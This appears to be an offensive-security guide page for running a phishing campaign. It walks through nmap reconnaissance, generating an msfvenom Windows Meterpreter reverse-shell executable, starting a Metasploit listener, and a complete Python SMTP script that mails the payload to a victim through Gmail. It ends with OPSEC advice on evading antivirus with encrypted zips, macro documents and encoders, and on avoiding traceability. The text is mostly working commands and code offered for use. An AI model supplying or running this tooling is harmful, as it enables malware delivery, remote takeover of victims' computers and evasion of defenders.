<Callout type="info" title="Concept Overview">
A guide for setting up a basic phishing campaign. This covers initial target reconnaissance, generating a payload, and developing a custom Python script to deliver the malicious payload via SMTP (Gmail) as an email attachment.

**MITRE ATT&CK Mapping:**
* [T1583 - Develop Capabilities](https://attack.mitre.org/tactics/T1583/)
* [T1566.001 - Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
* [T1059.006 - Python](https://attack.mitre.org/techniques/T1059/006/)

```mermaid
%%{init: {'theme': 'base', 'themeVariables': { 'background': '#050505', 'primaryColor': '#111118', 'edgeLabelBackground':'#050505', 'primaryTextColor': '#ffffff', 'primaryBorderColor': '#FF003C', 'lineColor': '#FF003C', 'fontFamily': 'monospace' }}}%%
flowchart LR
    A["Recon (Nmap)"] --> B["Gen Payload (msfvenom)"]
    B --> C["Python SMTP Sender"]
    C --> D["Victim Opens Attachment"]
    D --> E["Reverse Shell (Metasploit)"]
    
    classDef default fill:#111118,stroke:#585b70,stroke-width:1px,color:#ffffff;
    classDef attacker fill:#2a0008,stroke:#FF003C,stroke-width:2px,color:#FF003C;
    classDef action fill:#1a1a1a,stroke:#89b4fa,stroke-width:2px,color:#89b4fa;
    classDef exec fill:#1a1a1a,stroke:#D500F9,stroke-width:2px,color:#D500F9;

    class A action;
    class B,C attacker;
    class D action;
    class E exec;
```

</Callout>



---

## Execution Steps

<Steps>
  <Step title="Step 1: Reconnaissance">
    <Callout type="info" title="Network Reconnaissance">
    Scan the target to identify open ports and services (e.g., verifying if they have a mail server open or just for general target profiling).
    </Callout>
    ```bash
    nmap -Pn -sS -F -sV x.x.x.x
    ```
  </Step>

  <Step title="Step 2: Payload Generation & Listener">
    <Callout type="danger" title="Creating the Malicious Executable">
    Generate the payload that will be attached to the email and set up the Metasploit handler to catch the reverse shell when the victim opens it.
    </Callout>
    
    <Tabs>
      <Tab title="Generate Payload">
        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o file.exe
        ```
      </Tab>
      <Tab title="Setup Metasploit Listener">
        ```bash
        msfconsole -qx 'use exploit/multi/handler; set LHOST x.x.x.x; set LPORT 4444; set payload windows/meterpreter/reverse_tcp; run'
        ```
      </Tab>
    </Tabs>
  </Step>

  <Step title="Step 3: Resource Development (SMTP Sender Script)">
    This Python script uses `smtplib` to send an email with a malicious attachment. It connects to Gmail's SMTP server, authenticates, attaches the payload (`file.exe`), and sends it to the victim.
    
    <AccordionGroup>
      <Accordion title="Custom Python SMTP Script (`email_send.py`)">
        ```python
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders

        # Email settings
        sender_email = "your_email@gmail.com"
        receiver_email = "receiver_email@example.com"
        password = "your_email_password" # Use App Password if 2FA is enabled

        # Email subject and body
        subject = "Test Email with Attachment"
        body = "This is a test email with an attachment sent from Python using SMTP."

        # Path to the file attachment (e.g., the payload generated earlier)
        file_path = "file.exe"

        # Create the email message
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain')) # Attach the body of the email

        # Open the file and attach it to the email
        try:
            with open(file_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream') # MIME type for binary file
                part.set_payload(attachment.read()) # Read the file content
                encoders.encode_base64(part) # Encode the file in base64 for safe transmission
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename={file_path.split("/")[-1]}', # Set the attachment filename
                )
                msg.attach(part) # Attach the file to the email
        except Exception as e:
            print(f"Error attaching file: {e}")
            exit()

        # Connect to Gmail SMTP server
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587) # Use SMTP server for Gmail
            server.starttls() # Start TLS encryption for secure communication
            server.login(sender_email, password) # Log in to the sender's email account
            text = msg.as_string() # Convert the email message to string format
            server.sendmail(sender_email, receiver_email, text) # Send the email
            print("Email with attachment sent successfully!")
        except Exception as e:
            print(f"Failed to send email: {e}")
        finally:
            server.quit() # Close the connection to the SMTP server
        ```
      </Accordion>
    </AccordionGroup>
  </Step>

  <Step title="Step 4: Execution">
    <Callout type="success" title="Launching the Campaign">
    Make the script executable and run it to deliver the payload to the victim's inbox.
    </Callout>
    ```bash
    # Make the script executable
    chmod +x email_send.py

    # Run the script
    python3 email_send.py
    ```
  </Step>
</Steps>

---

## OPSEC & Gmail Considerations

<Callout type="warning" title="Operational Security (OPSEC)">
* **App Passwords:** If 2-Factor Authentication (2FA) is enabled on your Gmail account, you **cannot** use your standard password in the script. You must generate an "App Password" in your Google Account security settings and use that instead.
* **Antivirus/EDR:** Sending a raw `msfvenom` `.exe` attachment will almost certainly be caught by Gmail's built-in AV scanner or the victim's Windows Defender. Consider:
  1. Placing the `.exe` inside a password-protected `.zip` file.
  2. Using a Macro-enabled Word document (`.doc`) instead of an `.exe`.
  3. Obfuscating the payload using `shikata_ga_nai` or custom shellcode runners.
* **Traceability:** Using your real Gmail address is easily traceable. For red teaming, consider using spoofed domains or anonymous email services.
</Callout>
